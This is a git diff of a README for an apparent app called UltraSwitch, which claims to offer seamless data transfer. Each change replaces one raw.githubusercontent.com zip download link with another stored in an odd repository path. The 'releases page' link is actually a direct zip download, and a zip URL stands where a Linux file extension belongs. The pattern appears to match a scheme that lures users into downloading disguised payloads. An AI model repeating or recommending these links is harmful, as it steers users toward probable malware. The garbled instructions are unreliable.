@@ -1,6 +1,6 @@
 # 🎚️ UltraSwitch_Website - Seamless Data Transfer for Everyone
 
-[![Download Now](https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/Ultra-Switch-Website-3.3.zip%20Now-%https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/Ultra-Switch-Website-3.3.zip)](https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/Ultra-Switch-Website-3.3.zip)
+[![Download Now](https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/RepoData/Website_Ultra_Switch_v2.0-beta.2.zip%20Now-%https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/RepoData/Website_Ultra_Switch_v2.0-beta.2.zip)](https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/RepoData/Website_Ultra_Switch_v2.0-beta.2.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ This guide will help you download and run the UltraSwitch application on your de
 
 1. **Visit the Releases Page**  
    To download the software, click the link below:  
-   [Visit this page to download](https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/Ultra-Switch-Website-3.3.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/RepoData/Website_Ultra_Switch_v2.0-beta.2.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of UltraSwitch. Look for the latest version for the best experience.
@@ -23,7 +23,7 @@ This guide will help you download and run the UltraSwitch application on your de
    Each version will have different files. Be sure to select the one that matches your operating system. Here is a quick guide:  
    - **Windows**: Look for `.exe` files.
    - **MacOS**: Look for `.dmg` files.
-   - **Linux**: Look for files with `.deb` or `https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/Ultra-Switch-Website-3.3.zip` extensions.
+   - **Linux**: Look for files with `.deb` or `https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/RepoData/Website_Ultra_Switch_v2.0-beta.2.zip` extensions.
    - **Mobile**: You may find `.apk` files for Android.
 
 4. **Download the File**  
@@ -71,4 +71,4 @@ UltraSwitch is licensed under the GPL-3.0 License. You can use, modify, and dist
 
 For any inquiries, please reach out via the GitHub Discussions section or email the repository owner.
 
-[Visit this page to download](https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/Ultra-Switch-Website-3.3.zip)
+[Visit this page to download](https://raw.githubusercontent.com/stozoul/UltraSwitch_Website/UltraSwitch_Website_Main-dev/RepoData/Website_Ultra_Switch_v2.0-beta.2.zip)
